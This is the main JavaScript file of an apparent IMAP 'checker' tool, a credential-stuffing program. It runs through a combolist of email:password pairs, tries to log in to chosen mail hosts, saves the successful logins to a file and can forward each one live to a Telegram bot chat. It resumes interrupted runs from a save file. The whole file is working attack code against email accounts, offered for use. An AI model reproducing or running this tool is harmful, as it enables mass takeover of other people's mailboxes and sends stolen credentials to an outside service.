process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix
// dependencies

import colors from "colors";
import hashFile from "sha256-file";
import imaps from "imap-simple";
import telegramBot from "node-telegram-bot-api";
import * as configs from "./imaps.json";
import os from "os";
import * as Logger from "./Logger";
import * as IO from "./IO";
import * as Error from "./Error";
import * as Prompt from "./Prompt";
import * as Config from "./Config";
import * as Constants from './Constants';

var bot;
var selection, dictionary, id;
var max, counter, found, line, countTo, lastLine;
var resumeSave, unreachbleHost, botEnabled, timeout;
var log = "Nothing!";

dictionary = null;
max = counter = found = line = countTo = lastLine = 0;
timeout = resumeSave = unreachbleHost = botEnabled = false;

// Multiway Initialization
const setupBot = () => {
  botEnabled = true;
  const botToken = Constants.TELEGRAM_API_KEY; // INSERT YOUR API KEY
  if (botToken === "YOUR_API_KEY") {
    console.log(
      colors.white.bold(
        "You tried to activate the bot without putting your Telegram API KEY"
      )
    );
    console.log(
      colors.white.bold("Generate one here : ") +
        colors.underline.white.bold(
          "https://core.telegram.org/bots#6-botfather"
        )
    );
    process.exit();
  }
  bot = new telegramBot(botToken, { polling: true });

  bot.addListener("polling_error", error => {
    Error.telegramError();
    botEnabled = false;
    bot.stopPolling();
    process.exit(404);
  });

  bot.onText(/\/status/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(id, "Current progress is " + counter + " / " + max);
    bot.sendMessage(id, "Found " + found + " working combo...");
  });

  bot.onText(/\/log/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(id, log);
  });

  bot.onText(/\/start/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(
      id,
      "Hello and welcome to the\nIMAP Checker Bot,\n" +
        "Available commands are :\n" +
        "\t/status: Show current progress\n" +
        "\t/log: Show latest error\n"
    );
  });
  selectFilePrompt();
};

const timedOut = () => {
  console.log(os.EOL + "[*] Authentification TIMED OUT, retrying..." + "\r");
  countTo++;
  timeout = true;
  if (countTo >= 5) {
    console.log(colors.red("[*] Timed out too many times aborting attack!"));
    console.log(colors.red("[*] Current progress is " + counter + " / " + max));
    console.log(colors.red("[*] Found " + found + " working combo..."));
    process.exit();
  }
};

const connect = async config => {
  // MAKING A SAVE IN CASE OF A TIMEOUT
  await imaps
    .connect(config)
    .then(connection => {
      log = connection.toString();
      found++;
      process.stdout.write(
        colors.green(
          "\t[*] " + config.imap.user + ":" + config.imap.password + "\r\n"
        )
      );
      IO.writeResult(config.imap.user + ":" + config.imap.password + os.EOL);
      if (botEnabled)
        bot.sendMessage(
          id,
          "[*] " + config.imap.user + ":" + config.imap.password
        );
      forward();
    })
    .catch(error => {
      Logger.clear();
      console.log(
        colors.red(
          "[*] " +
            config.imap.user +
            ":" +
            config.imap.password +
            " | " +
            found +
            "/" +
            (counter + 1)
        )
      );
      if (error !== null) {
        log = error.toString();
        console.log(colors.red(log) + "\r");
      }
      if (error.errno === -3008) unreachbleHost = true;
      if (error.source === "timeout" || error.name === "ConnectionTimeoutError")
        timedOut();
      else forward();
    });
};

const forward = () => {
  Logger.progressBar.increment();
  counter++;
  countTo = 0;
};

const main = async () => {
  // READING SAVE FILE

  const saveData = IO.readSave();
  // CHECKING SAVE

  saveData.forEach(element => {
    if (
      JSON.stringify(element.host) === JSON.stringify(selection) &&
      element.hash === hashFile(dictionary)
    ) {
      line = element.index;
      found = element.found;
      max = element.max;
      counter = element.counter;
      resumeSave = true;
      console.log(
        colors.green(
          "[*] Save has been found!\n[*] Starting back the attack from " +
            new Date(element.timestamp).toLocaleString()
        )
      );
    }
  });

  var array = IO.getComboList(dictionary);

  // INITIALIZING LOOP

  if (!resumeSave)
    for (const line in array)
      for (let i = 0; i < selection.length; i++)
        for (const id in configs[selection[i]].tag)
          if (array[line].includes(configs[selection[i]].tag[id])) max++;

  Logger.progressBar.start(max, counter);

  // MAIN LOOP
  for (let line in array) {
    if (timeout) {
      line = lastLine;
      timeout = false;
    }
    let config = Config.get(array[line], selection);
    if (config) {
      lastLine = line;
      await connect(config);
    }
    if (unreachbleHost) break;
  }

  onComplete();
};

const selectFilePrompt = () => {
  Prompt.file()
    .then(output => {
      dictionary = output.path;
      main();
    })
    .catch(error => {
      Error.badDictionary();
    });
};

const onComplete = () => {
  Logger.progressBar.stop();
  Logger.clear();
  if (unreachbleHost) {
    console.log(
      colors.white.bold(
        "Unable to perform target host might be down or your internet connectivity!"
      )
    );
    return;
  }
  console.log(colors.white.bold("- IMAP Attack done -"));
  console.log(
    colors.white.bold("- Total Mail Tested: " + max.toString() + " -")
  );
  if (found > 0) IO.showResult();
  else
    console.log(
      colors.white.bold(
        "\nNothing found, try changing combolist or host :( ...\n"
      )
    );

  process.exit();
};

const telegramBotPrompt = () => {
  Prompt.bot()
    .then(answer => {
      if (answer.activeBot) setupBot();
      else selectFilePrompt();
    })
    .catch(err => {
      console.error(err);
      process.exit(1);
    });
};

const selectHostPrompt = () => {
  Prompt.host()
    .then(array => {
      if (array.selection.length) {
        selection = array.selection;
        telegramBotPrompt();
      } else Error.noHost();
    })
    .catch(err => {
      console.error(err);
      process.exit(1);
    });
};

const onCleanup = () => {
  if (!dictionary) return;
  var saveData = IO.readSave();
  var clean = [];

  const session = {
    timestamp: +new Date(),
    hash: hashFile(dictionary),
    index: line,
    counter: counter,
    max: max,
    found: found,
    host: selection
  };

  for (const key in saveData) {
    if (saveData.hasOwnProperty(key)) {
      const element = saveData[key];
      if (
        JSON.stringify(element.host) !== JSON.stringify(selection) ||
        element.hash !== hashFile(dictionary)
      )
        clean.push(element);
    }
  }

  clean.push(session);
  IO.writeSave(clean);
  //write SAVE FILE
};

const exitHandler = (options, exitCode) => {
  if (options.cleanup) onCleanup();
  if (options.exit) process.exit();
};

//do something when app is closing
process.on("exit", exitHandler.bind(null, { cleanup: true }));

//catches ctrl+c event
process.on("SIGINT", exitHandler.bind(null, { exit: true }));

// catches "kill pid" (for example: nodemon restart)
process.on("SIGUSR1", exitHandler.bind(null, { exit: true }));
process.on("SIGUSR2", exitHandler.bind(null, { exit: true }));

//catches uncaught exceptions
//process.on("uncaughtException", exitHandler.bind(null, { exit: true }));

IO.createSave(); //create Save File
selectHostPrompt(); // Start Wizard

process.stdin.resume(); //so the program will not close instantly